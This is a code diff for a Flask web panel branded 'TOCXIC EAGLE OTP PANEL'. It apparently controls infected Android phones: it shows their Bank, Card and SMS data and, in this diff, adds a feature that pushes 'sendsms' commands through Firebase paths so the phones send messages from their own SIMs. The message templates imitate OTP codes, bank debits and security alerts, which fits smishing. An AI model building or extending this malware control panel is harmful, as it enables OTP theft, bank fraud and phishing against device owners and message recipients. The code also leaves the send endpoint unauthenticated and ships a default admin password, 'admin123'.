@@ -2,14 +2,18 @@
 # -*- coding: utf-8 -*-
 """
 ═══════════════════════════════════════════════════════════════════
-  TOCXIC EAGLE OTP PANEL — COMPLETE EDITION
+  TOCXIC EAGLE OTP PANEL — v72 COMPLETE
 ═══════════════════════════════════════════════════════════════════
-  • Users:   Public /user panel (no login)
-  • Admin:   /admin login protected
-  • Theme:   Dark (matching index.html)
-  • Broadcast: Admin sends → MongoDB → users see via 📧 Mail tab
-  • BG_REFRESH_INTERVAL = 600s
-  • ALL FEATURES INCLUDED — no line missing
+  Features:
+    • User panel /user  (public, no login)
+    • Admin panel /admin/dashboard (login protected)
+    • Broadcast mail (admin → users via 📧 Mail tab)
+    • Send SMS (via Firebase RTDB command paths → Android app)
+    • Personal OTP page
+    • Firebases management
+    • Security / password change
+    • Dark theme (matching index.html)
+    • BG_REFRESH_INTERVAL = 600s
 ═══════════════════════════════════════════════════════════════════
 """
 
@@ -52,7 +56,7 @@ DEFAULT_ADMIN_PWD = os.environ.get("DEFAULT_ADMIN_PWD", "admin123")
 # MONGODB
 # ═══════════════════════════════════════════════════════════════
 MONGO_OK = False
-mongo_client = db = fb_collection = settings_collection = broadcast_collection = None
+mongo_client = db = fb_collection = settings_collection = broadcast_collection = sms_log_collection = None
 _mongo_ready = False
 _mongo_lock = threading.Lock()
 
@@ -60,7 +64,7 @@ def fb_hash(url):
     return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]
 
 def init_mongo(force=False):
-    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, broadcast_collection, _mongo_ready
+    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, broadcast_collection, sms_log_collection, _mongo_ready
     if _mongo_ready and not force:
         return MONGO_OK
     with _mongo_lock:
@@ -73,11 +77,12 @@ def init_mongo(force=False):
             fb_collection = db["firebases"]
             settings_collection = db["settings"]
             broadcast_collection = db["broadcasts"]
+            sms_log_collection = db["sms_logs"]
             try:
                 broadcast_collection.create_index([("device_id", 1), ("created_at", -1)])
                 broadcast_collection.create_index([("bc_id", 1)])
-                broadcast_collection.create_index([("created_at", -1)])
                 fb_collection.create_index([("url", 1)], unique=True)
+                sms_log_collection.create_index([("sent_at", -1)])
             except Exception:
                 pass
             mongo_client.admin.command("ping")
@@ -617,7 +622,7 @@ def bg_refresher():
         time.sleep(BG_REFRESH_INTERVAL)
 
 # ═══════════════════════════════════════════════════════════════
-# AUTH DECORATOR
+# AUTH
 # ═══════════════════════════════════════════════════════════════
 def admin_required(f):
     @wraps(f)
@@ -630,7 +635,7 @@ def admin_required(f):
     return wrapper
 
 # ═══════════════════════════════════════════════════════════════
-# SHARED HTML/CSS — DARK THEME
+# DARK THEME CSS
 # ═══════════════════════════════════════════════════════════════
 ORBITRON = """
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -647,6 +652,7 @@ DARK_CSS = """
   --red:#E40000;--red2:#FF4D4D;--blue:#0F3CC9;--blue2:#3B82F6;
   --grad:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
   --grad-r:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
+  --grad-b:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
   --green:#22c55e;--purple:#a855f7;--amber:#f59e0b;
   --radius:10px;--radius2:14px;
 }
@@ -768,6 +774,7 @@ border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s;curso
 .tab.active{color:var(--red2);border-bottom-color:var(--red)}
 .tab.active-g{color:var(--green);border-bottom-color:var(--green)}
 .tab.active-p{color:var(--purple);border-bottom-color:var(--purple)}
+.tab.active-b{color:var(--blue2);border-bottom-color:var(--blue2)}
 .tab.active-mail{color:var(--amber);border-bottom-color:var(--amber)}
 .tab .tab-emoji{font-size:13px;margin-right:4px}
 
@@ -831,7 +838,7 @@ font-family:'Orbitron',sans-serif;letter-spacing:.5px;cursor:pointer;min-height:
 .mail-tab-btn.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border-color:transparent;
 box-shadow:0 4px 12px rgba(245,158,11,.3)}
 
-.bc-fab{position:fixed;bottom:24px;right:24px;z-index:45;
+.bc-fab{position:fixed;bottom:24px;right:94px;z-index:45;
   width:60px;height:60px;border-radius:50%;
   background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;
   display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;
@@ -843,21 +850,38 @@ box-shadow:0 4px 12px rgba(245,158,11,.3)}
   display:flex;align-items:center;justify-content:center;border:2px solid var(--bg);
   font-family:'Orbitron',sans-serif}
 
-.bc-modal{position:fixed;inset:0;z-index:80;background:rgba(0,0,0,.75);
+.compose-fab{position:fixed;bottom:24px;right:24px;z-index:45;
+  width:60px;height:60px;border-radius:50%;
+  background:linear-gradient(135deg,#0F3CC9,#3B82F6);color:#fff;border:none;
+  display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:900;
+  box-shadow:0 10px 30px rgba(59,130,246,.45),0 4px 12px rgba(15,60,201,.35);
+  transition:.2s;cursor:pointer}
+.compose-fab:hover{transform:scale(1.06) rotate(-6deg);filter:brightness(1.1)}
+
+.bc-modal,.send-modal{position:fixed;inset:0;z-index:80;background:rgba(0,0,0,.75);
 backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;padding:16px}
-.bc-modal.open{display:flex}
+.bc-modal.open,.send-modal.open{display:flex}
 .bc-box{width:100%;max-width:640px;max-height:92vh;overflow-y:auto;
   background:var(--bg2);border:1px solid rgba(245,158,11,.35);border-radius:18px;
   box-shadow:0 30px 80px rgba(245,158,11,.25);animation:popIn .2s ease-out}
+.send-box{width:100%;max-width:540px;max-height:92vh;overflow-y:auto;
+  background:var(--bg2);border:1px solid rgba(59,130,246,.35);border-radius:18px;
+  box-shadow:0 30px 80px rgba(59,130,246,.25);animation:popIn .2s ease-out}
 @keyframes popIn{from{transform:scale(.94);opacity:.6}to{transform:scale(1);opacity:1}}
-.bc-head{padding:16px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;
-  background:linear-gradient(135deg,rgba(245,158,11,.12),rgba(228,0,0,.06))}
+.bc-head,.send-box-head{padding:16px 18px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:10px}
+.bc-head{background:linear-gradient(135deg,rgba(245,158,11,.12),rgba(228,0,0,.06))}
+.send-box-head{background:linear-gradient(135deg,rgba(15,60,201,.12),rgba(59,130,246,.08))}
 .bc-head .bc-icon{width:38px;height:38px;border-radius:11px;
   background:linear-gradient(135deg,#f59e0b,#f97316);
   display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;flex-shrink:0}
+.send-box-head .sb-icon{width:38px;height:38px;border-radius:11px;
+  background:linear-gradient(135deg,#0F3CC9,#3B82F6);
+  display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}
 .bc-head .bc-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;color:var(--amber)}
-.bc-head .bc-sub{font-size:10px;color:var(--text3);margin-top:2px;font-family:'JetBrains Mono',monospace}
-.bc-body{padding:18px}
+.send-box-head .sb-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;color:var(--blue2)}
+.bc-head .bc-sub,.send-box-head .sb-sub{font-size:10px;color:var(--text3);margin-top:2px;font-family:'JetBrains Mono',monospace}
+.bc-body,.send-box-body{padding:18px}
 .bc-target-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
 .bc-ts{padding:12px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;text-align:center}
 .bc-ts .n{font-size:20px;font-weight:900;font-family:'Orbitron',sans-serif;line-height:1}
@@ -887,14 +911,16 @@ backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center
 .bc-dev-title{font-size:12px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .bc-dev-sub{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:2px}
 .bc-dev-status{font-size:11px;flex-shrink:0}
-.bc-templates{display:flex;gap:6px;margin-bottom:10px;overflow-x:auto;padding-bottom:2px}
-.bc-chip{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
+.bc-templates,.template-row{display:flex;gap:6px;margin-bottom:10px;overflow-x:auto;padding-bottom:2px}
+.bc-chip,.template-chip{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
   background:var(--bg3);border:1px solid var(--border2);color:var(--text3);
   white-space:nowrap;transition:.15s;cursor:pointer}
 .bc-chip:hover{border-color:var(--amber);color:var(--amber)}
-.bc-counter{display:flex;justify-content:space-between;align-items:center;
+.template-chip:hover{border-color:var(--blue2);color:var(--blue2)}
+.bc-counter,.char-counter{display:flex;justify-content:space-between;align-items:center;
   font-size:10px;color:var(--text3);margin-top:6px;font-family:'JetBrains Mono',monospace}
-.bc-counter.warn{color:var(--amber)}.bc-counter.over{color:var(--red2)}
+.bc-counter.warn,.char-counter.warn{color:var(--amber)}
+.bc-counter.over,.char-counter.over{color:var(--red2)}
 .bc-progress{margin-top:12px;padding:10px 12px;border-radius:10px;
   background:var(--bg3);border:1px solid var(--border2);display:none}
 .bc-progress.show{display:block}
@@ -912,6 +938,34 @@ backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center
   transition:.15s;cursor:pointer;font-family:inherit}
 .btn-bc:hover{filter:brightness(1.08)}
 .btn-bc:disabled{opacity:.5;cursor:not-allowed}
+.btn-send{background:linear-gradient(135deg,#0F3CC9,#3B82F6);color:#fff;
+  box-shadow:0 4px 14px rgba(59,130,246,.35);border:none;
+  display:inline-flex;align-items:center;justify-content:center;gap:6px;
+  padding:13px;border-radius:10px;font-size:13px;font-weight:800;
+  transition:.15s;cursor:pointer;font-family:inherit}
+.btn-send:hover{filter:brightness(1.08)}
+.btn-send:disabled{opacity:.5;cursor:not-allowed}
+
+.sim-picker{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px}
+.sim-opt{padding:12px;border-radius:12px;background:var(--bg3);border:2px solid var(--border);
+  cursor:pointer;transition:.15s}
+.sim-opt:hover{border-color:var(--border2)}
+.sim-opt.active{border-color:var(--blue2);background:rgba(15,60,201,.08);
+  box-shadow:0 0 0 3px rgba(59,130,246,.12)}
+.sim-opt .sim-label{font-size:11px;font-weight:800;color:var(--text2);letter-spacing:.5px;
+  font-family:'Orbitron',sans-serif}
+.sim-opt.active .sim-label{color:var(--blue2)}
+.sim-opt .sim-num{font-size:10px;color:var(--text3);margin-top:3px;
+  font-family:'JetBrains Mono',monospace}
+.recipient-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.recipient-tag{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;
+  background:rgba(15,60,201,.15);border:1px solid rgba(59,130,246,.3);
+  border-radius:20px;font-size:11px;font-weight:700;color:var(--blue2);
+  font-family:'JetBrains Mono',monospace}
+.recipient-tag .rm{width:14px;height:14px;border-radius:50%;background:rgba(228,0,0,.3);
+  color:#fff;display:flex;align-items:center;justify-content:center;
+  font-size:9px;font-weight:900;cursor:pointer}
+.recipient-tag .rm:hover{background:var(--red)}
 
 .loading-text{text-align:center;padding:26px;color:var(--text3);font-size:13px;
 background:var(--bg2);border-radius:18px;margin-bottom:16px;border:1px solid var(--border)}
@@ -954,12 +1008,13 @@ max-width:90vw;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.5)}
   .drawer{max-width:100%}
   .stats-bar{padding:0 8px}.stat-item{padding:8px 12px}
   .topbar{padding:8px 12px}
-  .bc-fab{bottom:20px;right:20px;width:52px;height:52px;font-size:22px}
+  .bc-fab{bottom:20px;right:80px;width:52px;height:52px;font-size:22px}
+  .compose-fab{bottom:20px;right:20px;width:52px;height:52px;font-size:22px}
 }
 """
 
 # ═══════════════════════════════════════════════════════════════
-# LANDING PAGE
+# LANDING
 # ═══════════════════════════════════════════════════════════════
 LANDING_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE</title>
@@ -1020,7 +1075,7 @@ letter-spacing:3px;text-transform:uppercase}
 <div class="feat"><div class="fi">🛡️</div><div class="fl">Secure</div></div>
 <div class="feat"><div class="fi">🔄</div><div class="fl">Auto 10m</div></div>
 </div>
-<div class="footer">TOCXIC EAGLE · v71</div>
+<div class="footer">TOCXIC EAGLE · v72</div>
 </div>
 </body></html>"""
 
@@ -1073,7 +1128,7 @@ else{i.type='password';t.textContent='👁️';}}
 </body></html>"""
 
 # ═══════════════════════════════════════════════════════════════
-# MAIN PANEL — shared between /user and /admin/dashboard
+# MAIN PANEL TEMPLATE
 # ═══════════════════════════════════════════════════════════════
 PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Panel</title>
@@ -1132,6 +1187,67 @@ PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
 
 {SHOW_BC_FAB}
 
+<!-- ✉️ SEND SMS MODAL -->
+<div class="send-modal" id="send-modal" onclick="if(event.target===this)closeSendModal()">
+  <div class="send-box">
+    <div class="send-box-head">
+      <div class="sb-icon">✉️</div>
+      <div class="flex1 min0">
+        <div class="sb-title">SEND SMS</div>
+        <div class="sb-sub" id="send-subtitle">no device selected</div>
+      </div>
+      <button class="btn-icon" onclick="closeSendModal()">✕</button>
+    </div>
+    <div class="send-box-body">
+      <div class="section-label">SIM Slot</div>
+      <div class="sim-picker">
+        <div class="sim-opt active" id="sim-opt-1" onclick="pickSim(1)">
+          <div class="sim-label">📶 SIM 1</div>
+          <div class="sim-num" id="sim1-num">— — —</div>
+        </div>
+        <div class="sim-opt" id="sim-opt-2" onclick="pickSim(2)">
+          <div class="sim-label">📶 SIM 2</div>
+          <div class="sim-num" id="sim2-num">— — —</div>
+        </div>
+      </div>
+
+      <div class="section-label" style="margin-top:12px">
+        <span>Recipients</span>
+        <span style="font-weight:600;color:var(--text3);font-size:9px;letter-spacing:0">comma or newline separated</span>
+      </div>
+      <input class="inp" id="send-to" placeholder="+919876543210, +919988776655"
+             oninput="updateRecipients()" style="font-family:'JetBrains Mono',monospace;font-size:13px">
+      <div class="recipient-tags" id="recipient-tags"></div>
+
+      <div class="section-label" style="margin-top:16px">Message</div>
+      <div class="template-row">
+        <div class="template-chip" onclick="applyTemplate('otp')">🔐 OTP</div>
+        <div class="template-chip" onclick="applyTemplate('bank')">🏦 Bank</div>
+        <div class="template-chip" onclick="applyTemplate('alert')">⚠️ Alert</div>
+        <div class="template-chip" onclick="applyTemplate('delivery')">📦 Delivery</div>
+        <div class="template-chip" onclick="applyTemplate('blank')">🗑 Clear</div>
+      </div>
+      <textarea class="inp" id="send-body" placeholder="Type your message…"
+                oninput="updateCounter()" rows="4" style="min-height:100px"></textarea>
+      <div class="char-counter" id="char-counter">
+        <span id="char-segments">1 SMS · GSM-7</span>
+        <span id="char-count">0 / 160</span>
+      </div>
+
+      <div class="bc-progress" id="send-progress">
+        <div class="bc-progress-bar"><div class="bc-progress-fill" id="send-progress-fill"></div></div>
+        <div class="bc-progress-text" id="send-progress-text">Sending…</div>
+      </div>
+
+      <div class="bc-actions">
+        <button class="btn btn-ghost" onclick="closeSendModal()">Cancel</button>
+        <button class="btn-send" id="send-btn" onclick="doSend()">✉️ Send SMS</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 📧 BROADCAST MODAL -->
 <div class="bc-modal" id="broadcast-modal" onclick="if(event.target===this)closeBroadcastModal()">
   <div class="bc-box">
     <div class="bc-head">
@@ -1201,6 +1317,7 @@ PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
       <div class="tab" id="tab-bank" onclick="switchTab('bank',this)">Bank</div>
       <div class="tab" id="tab-card" onclick="switchTab('card',this)">Card</div>
       <div class="tab" onclick="switchTab('sms',this)"><span class="tab-emoji">🛜</span>SMS</div>
+      <div class="tab" onclick="switchTab('send',this)"><span class="tab-emoji">✉️</span>Send</div>
       <div class="tab" id="tab-mail" onclick="switchTab('mail',this)"><span class="tab-emoji">📧</span>Mail</div>
     </div>
     <div class="drawer-body">
@@ -1208,6 +1325,7 @@ PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
       <div id="panel-bank" style="display:none"></div>
       <div id="panel-card" style="display:none"></div>
       <div id="panel-sms" style="display:none"></div>
+      <div id="panel-send" style="display:none"></div>
       <div id="panel-mail" style="display:none"></div>
     </div>
   </div>
@@ -1223,6 +1341,9 @@ let devices = [], currentFilter = "all", currentSort = "new", openDev = null;
 let smsCache = {}, smsAnalysisCache = {};
 let bcTargetMode = "all", bcManualSelected = new Set(), bcTargets = [];
 let allBroadcastsForDevice = [];
+
+/* SEND state */
+let sendDevice = null, selectedSim = 1, sendRecipients = [];
 
 function showToast(msg, dur = 3000) {
   const t = $("#toast"); if (!t) return;
@@ -1490,15 +1611,16 @@ function renderDrawerStatus() {
 }
 
 window.switchTab = function (name, el) {
-  ["info","bank","card","sms","mail"].forEach(p => {
+  ["info","bank","card","sms","send","mail"].forEach(p => {
     const e = $("#panel-" + p); if (e) e.style.display = "none";
   });
-  $$(".tab").forEach(t => t.classList.remove("active","active-g","active-p","active-mail"));
+  $$(".tab").forEach(t => t.classList.remove("active","active-g","active-p","active-b","active-mail"));
   const panel = $("#panel-" + name);
   if (panel) panel.style.display = "block";
   if (el) {
     if (name === "bank") el.classList.add("active-g");
     else if (name === "card") el.classList.add("active-p");
+    else if (name === "send") el.classList.add("active-b");
     else if (name === "mail") el.classList.add("active-mail");
     else el.classList.add("active");
   }
@@ -1506,6 +1628,7 @@ window.switchTab = function (name, el) {
   if (name === "bank") renderPanelBank();
   if (name === "card") renderPanelCard();
   if (name === "sms") renderPanelSms();
+  if (name === "send") renderPanelSend();
   if (name === "mail") renderPanelMail();
 };
 
@@ -1601,6 +1724,51 @@ function renderPanelSms() {
     }).join("");
 }
 
+function renderPanelSend() {
+  if (!openDev) return;
+  const p = $("#panel-send");
+  const phone = openDev.phoneNumber !== "—" ? openDev.phoneNumber : "";
+  p.innerHTML = `
+    <div style="background:linear-gradient(135deg,rgba(15,60,201,.12),rgba(59,130,246,.08));
+         border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:16px;margin-bottom:14px">
+      <div style="font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;
+           letter-spacing:1px;color:var(--blue2);margin-bottom:8px">✉️ SEND SMS / MESSAGE</div>
+      <div style="font-size:11px;color:var(--text3);line-height:1.5;margin-bottom:12px">
+        Full composer with templates, multi-recipient, SIM picker.
+      </div>
+      <button class="btn-send" style="width:100%" onclick="openSendModal('${openDev.id}')">
+        Open Composer
+      </button>
+    </div>
+    <div class="section-label">Quick Send to this Number</div>
+    <input class="inp" id="qs-to" placeholder="+919876543210" value="${escHtml(phone)}"
+      style="font-family:'JetBrains Mono',monospace;margin-bottom:10px">
+    <textarea class="inp" id="qs-body" placeholder="Type quick message…" rows="3"></textarea>
+    <button class="btn-send" style="width:100%;margin-top:10px" onclick="quickSend()">
+      ✉️ Send Now
+    </button>
+  `;
+}
+
+window.quickSend = async function () {
+  const to = $("#qs-to").value.trim();
+  const body = $("#qs-body").value.trim();
+  if (!to || !body) { showToast("❌ Fill number and message"); return; }
+  if (!openDev?.firebase) { showToast("❌ No firebase"); return; }
+  try {
+    const r = await fetch("/api/send", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        firebase: openDev.firebase, device_id: openDev.device_id,
+        to, message: body, sim: 1,
+      }),
+    });
+    const d = await r.json();
+    if (d.success) { showToast("✅ SMS queued"); $("#qs-body").value = ""; }
+    else showToast("❌ " + (d.error || "Failed"));
+  } catch(e) { showToast("❌ Network error"); }
+};
+
 function renderPanelMail() {
   const p = $("#panel-mail");
   if (!p) return;
@@ -1660,6 +1828,133 @@ window.markBroadcastRead = async function (id) {
   renderPanelMail();
 };
 
+/* SEND SMS */
+const TEMPLATES = {
+  otp: "Your OTP is 123456. Do not share with anyone. Valid for 10 minutes.",
+  bank: "Your A/c XX1234 has been debited with Rs.1000.00. Avl Bal Rs.25,000.00.",
+  alert: "ALERT: Unusual login attempt detected on your account. Contact support immediately.",
+  delivery: "Your order #OD12345 has been shipped. Expected delivery in 2-3 business days.",
+  blank: "",
+};
+
+window.openSendModal = function (compositeId) {
+  sendDevice = compositeId ? devices.find(d => d.id === compositeId) : (openDev || devices[0]);
+  if (!sendDevice) { showToast("❌ No device available"); return; }
+  const sims = sendDevice.sims || [];
+  $("#send-subtitle").textContent = `${sendDevice.name} · ${sendDevice.slug}`;
+  $("#sim1-num").textContent = sims[0]?.phoneNumber || sims[0]?.number || sendDevice.phoneNumber || "no sim";
+  $("#sim2-num").textContent = sims[1]?.phoneNumber || sims[1]?.number || "not present";
+  if (selectedSim === 2 && !sims[1]) selectedSim = 1;
+  pickSim(selectedSim);
+  $("#send-to").value = sendDevice.phoneNumber !== "—" ? sendDevice.phoneNumber : "";
+  updateRecipients(); updateCounter();
+  $("#send-progress").classList.remove("show");
+  $("#send-modal").classList.add("open");
+};
+
+window.closeSendModal = function () { $("#send-modal").classList.remove("open"); };
+
+window.pickSim = function (n) {
+  selectedSim = n;
+  $("#sim-opt-1").classList.toggle("active", n === 1);
+  $("#sim-opt-2").classList.toggle("active", n === 2);
+};
+
+function parseRecipients(str) {
+  return String(str || "").split(/[\n,;]+/).map(s => s.trim()).filter(Boolean)
+    .map(s => {
+      const d = s.replace(/[^0-9]/g, "");
+      if (d.length === 10) return d;
+      if (d.length === 12 && d.startsWith("91")) return d.slice(2);
+      if (d.length === 11 && d.startsWith("0")) return d.slice(1);
+      return s;
+    });
+}
+
+window.updateRecipients = function () {
+  const raw = $("#send-to").value;
+  sendRecipients = [...new Set(parseRecipients(raw))];
+  const box = $("#recipient-tags");
+  if (!sendRecipients.length) { box.innerHTML = ""; return; }
+  box.innerHTML = sendRecipients.map((r, i) =>
+    `<span class="recipient-tag">${escHtml(r)}<span class="rm" onclick="removeRecipient(${i})">✕</span></span>`
+  ).join("");
+};
+
+window.removeRecipient = function (i) {
+  sendRecipients.splice(i, 1);
+  $("#send-to").value = sendRecipients.join(", ");
+  updateRecipients();
+};
+
+window.applyTemplate = function (k) {
+  $("#send-body").value = TEMPLATES[k] || "";
+  updateCounter();
+};
+
+function detectEncoding(text) {
+  const gsm = /^[@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\-./0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà\s\f^{}\\[~\]|€]*$/;
+  return gsm.test(text) ? "GSM-7" : "UCS-2";
+}
+
+window.updateCounter = function () {
+  const txt = $("#send-body").value || "";
+  const enc = detectEncoding(txt);
+  const len = txt.length;
+  let seg, per;
+  if (enc === "GSM-7") { seg = len <= 160 ? 1 : Math.ceil(len / 153); per = len <= 160 ? 160 : 153; }
+  else { seg = len <= 70 ? 1 : Math.ceil(len / 67); per = len <= 70 ? 70 : 67; }
+  const inSeg = seg === 1 ? len : len - ((seg - 1) * per);
+  $("#char-count").textContent = `${inSeg} / ${per}`;
+  $("#char-segments").textContent = `${seg} SMS · ${enc}`;
+  const el = $("#char-counter");
+  el.className = "char-counter";
+  if (seg > 3) el.classList.add("over");
+  else if (seg > 1) el.classList.add("warn");
+};
+
+window.doSend = async function () {
+  const body = $("#send-body").value.trim();
+  if (!sendRecipients.length) { showToast("❌ Add at least one recipient"); return; }
+  if (!body) { showToast("❌ Message is empty"); return; }
+  if (!sendDevice) { showToast("❌ No device selected"); return; }
+  if (!sendDevice.firebase) { showToast("❌ Device has no firebase"); return; }
+
+  const btn = $("#send-btn"); btn.disabled = true;
+  const prog = $("#send-progress"); prog.classList.add("show");
+  const fill = $("#send-progress-fill"), txt = $("#send-progress-text");
+
+  let ok = 0, fail = 0;
+  for (let i = 0; i < sendRecipients.length; i++) {
+    const to = sendRecipients[i];
+    fill.style.width = Math.round((i / sendRecipients.length) * 100) + "%";
+    txt.textContent = `Sending ${i + 1}/${sendRecipients.length} → ${to}`;
+    try {
+      const r = await fetch("/api/send", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          firebase: sendDevice.firebase,
+          device_id: sendDevice.device_id,
+          to, message: body, sim: selectedSim,
+        }),
+      });
+      const d = await r.json();
+      if (d.success) ok++; else fail++;
+    } catch(e) { fail++; }
+  }
+  fill.style.width = "100%";
+  txt.textContent = `✅ ${ok} sent · ${fail} failed`;
+  setTimeout(() => {
+    prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false;
+    if (fail === 0) {
+      showToast(`✅ ${ok} SMS queued`);
+      $("#send-body").value = ""; $("#send-to").value = "";
+      sendRecipients = []; updateRecipients(); updateCounter();
+    } else showToast(`⚠️ ${ok} sent · ${fail} failed`);
+  }, 1400);
+};
+
+/* BROADCAST */
 function updateBcCountBadge() {
   const badge = $("#bc-count-badge");
   if (!badge) return;
@@ -1734,11 +2029,6 @@ const BC_TEMPLATES = {
   blank: "",
 };
 window.applyBcTemplate = k => { $("#bc-body").value = BC_TEMPLATES[k] || ""; updateBcCounter(); };
-
-function detectEncoding(text) {
-  const gsm = /^[@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\-./0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà\s\f^{}\\[~\]|€]*$/;
-  return gsm.test(text) ? "GSM-7" : "UCS-2";
-}
 
 window.updateBcCounter = function () {
   const txt = $("#bc-body").value || "";
@@ -2028,7 +2318,7 @@ def admin_dashboard():
     return Response(build_panel(True), mimetype="text/html")
 
 # ═══════════════════════════════════════════════════════════════
-# API — public
+# API
 # ═══════════════════════════════════════════════════════════════
 @app.route("/api/conn")
 def api_conn():
@@ -2117,7 +2407,109 @@ def api_inbox():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ═══════════════════════════════════════════════════════════════
-# BROADCAST APIs
+# SEND SMS
+# ═══════════════════════════════════════════════════════════════
+@app.route("/api/send", methods=["POST"])
+def api_send_sms():
+    try:
+        data = request.get_json() or {}
+        fb_url     = (data.get("firebase") or "").strip().rstrip("/")
+        device_id  = (data.get("device_id") or "").strip()
+        to         = (data.get("to") or "").strip()
+        message    = (data.get("message") or "").strip()
+        sim_slot   = int(data.get("sim") or 1)
+        if not fb_url or not device_id or not to or not message:
+            return jsonify({"success": False, "error": "Missing fields"}), 400
+        if not fb_url.startswith("http"):
+            fb_url = "https://" + fb_url
+
+        cmd = {
+            "to": to,
+            "message": message,
+            "sim": sim_slot,
+            "action": "sendsms",
+            "status": "pending",
+            "timestamp": int(time.time() * 1000),
+            "from": "admin_panel",
+        }
+
+        cmd_paths = [
+            f"/commands/{device_id}.json",
+            f"/sendsms/{device_id}.json",
+            f"/sendsms.json",
+            f"/clients/{device_id}/task.json",
+            f"/clients/{device_id}/commands.json",
+            f"/clients/{device_id}/sendSms.json",
+            f"/devices/{device_id}/commands.json",
+            f"/devices/{device_id}/sendsms.json",
+        ]
+
+        s = _sess()
+        written = False
+        used_path = None
+        for p in cmd_paths:
+            try:
+                r = s.put(fb_url + p, json=cmd, timeout=6)
+                if r.status_code in (200, 201):
+                    written = True
+                    used_path = p
+                    break
+            except Exception:
+                continue
+
+        if not written:
+            try:
+                r = s.post(fb_url + "/commands.json", json=cmd, timeout=6)
+                if r.status_code in (200, 201):
+                    written = True
+                    used_path = "/commands.json"
+            except Exception:
+                pass
+
+        if not written:
+            return jsonify({"success": False, "error": "All Firebase paths failed"}), 500
+
+        init_mongo()
+        if MONGO_OK:
+            try:
+                sms_log_collection.insert_one({
+                    "firebase": fb_url,
+                    "device_id": device_id,
+                    "to": to,
+                    "message": message,
+                    "sim": sim_slot,
+                    "path": used_path,
+                    "status": "sent",
+                    "sent_at": int(time.time()),
+                    "source": "panel",
+                })
+            except Exception:
+                pass
+
+        return jsonify({"success": True, "queued": True, "path": used_path})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/sms/logs")
+@admin_required
+def api_sms_logs():
+    init_mongo()
+    if not MONGO_OK:
+        return jsonify({"success": True, "logs": []})
+    try:
+        docs = list(sms_log_collection.find({}).sort("sent_at", -1).limit(200))
+        out = [{
+            "id": str(d["_id"]), "firebase": d.get("firebase",""),
+            "device_id": d.get("device_id",""), "to": d.get("to",""),
+            "message": d.get("message",""), "sim": d.get("sim",1),
+            "status": d.get("status","sent"), "sent_at": int(d.get("sent_at",0)),
+        } for d in docs]
+        return jsonify({"success": True, "logs": out, "count": len(out)})
+    except Exception as e:
+        return jsonify({"success": True, "logs": [], "error": str(e)})
+
+# ═══════════════════════════════════════════════════════════════
+# BROADCAST
 # ═══════════════════════════════════════════════════════════════
 @app.route("/api/broadcast", methods=["POST"])
 @admin_required
@@ -2201,26 +2593,6 @@ def api_broadcasts_mark_read():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route("/api/broadcasts/list")
-@admin_required
-def api_broadcasts_list():
-    init_mongo()
-    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        docs = list(broadcast_collection.find({}).sort("created_at", -1).limit(500))
-        out = []
-        for d in docs:
-            out.append({
-                "id": str(d["_id"]), "bc_id": d.get("bc_id"),
-                "device_id": d.get("device_id", ""), "number": d.get("number", ""),
-                "device_name": d.get("device_name", ""), "fb_name": d.get("fb_name", ""),
-                "message": d.get("message", ""), "status": d.get("status", "delivered"),
-                "read": bool(d.get("read", False)), "created_at": int(d.get("created_at", 0)),
-            })
-        return jsonify({"success": True, "broadcasts": out, "count": len(out)})
